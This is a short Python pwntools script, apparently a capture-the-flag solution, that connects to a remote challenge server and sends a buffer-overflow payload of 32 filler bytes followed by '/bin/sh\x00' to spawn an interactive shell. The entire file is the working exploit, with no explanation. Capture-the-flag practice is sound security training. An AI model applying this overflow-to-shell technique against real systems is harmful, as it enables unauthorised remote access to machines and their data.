from pwn import *

context.gdb_binary = "/bin/pwndbg"
#io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 26118)


payload = b"a" * 0x20 + b"/bin/sh\x00"

#gdb.attach(io)
io.sendline(payload)
io.interactive()
